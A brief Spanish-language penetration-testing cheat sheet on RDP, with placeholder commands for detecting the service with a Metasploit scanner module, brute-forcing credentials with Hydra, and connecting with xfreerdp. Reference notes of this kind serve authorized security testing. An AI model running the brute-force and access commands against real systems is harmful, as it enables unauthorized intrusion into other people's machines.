Herramientas para enumeración y acceso a servicios RDP.

• Detectar servicio RDP  
• Fuerza bruta  
• Acceso remoto

## RDP Scanner

Detecta si el servicio RDP está activo.

```
use auxiliary/scanner/rdp/rdp_scanner
```
	set RHOSTS IP
	set RPORT (3389)

## Fuerza bruta (Hydra)

Ataque de credenciales contra RDP.

```
hydra -L USER -P PASSWORD rdp://IP -s PORT
```

## Acceso con xfreerdp

Conexión remota al sistema.

```
xfreerdp /u:USER /p:PASSWORD /v:IP:PORT
```

